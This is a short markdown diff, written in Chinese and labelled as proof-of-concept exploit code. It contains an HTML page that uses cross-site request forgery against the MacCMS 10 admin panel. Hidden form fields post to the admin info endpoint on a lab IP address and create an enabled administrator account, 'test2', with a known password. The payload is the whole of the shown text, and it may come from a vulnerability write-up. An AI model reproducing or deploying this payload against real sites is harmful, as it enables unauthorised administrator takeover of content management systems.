@@ -1,0 +1,19 @@
+### POC实现代码如下：  
+
+> exp代码如下：  
+
+``` html
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://10.211.55.17/maccms10/admin.php/admin/admin/info.html" method="POST">
+      <input type="hidden" name="admin_id" value="" />
+      <input type="hidden" name="admin_name" value="test2" />
+      <input type="hidden" name="admin_pwd" value="test2" />
+      <input type="hidden" name="admin_status" value="1" />
+      <input type="hidden" name="admin_auth[0]" value="index/welcome" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+```
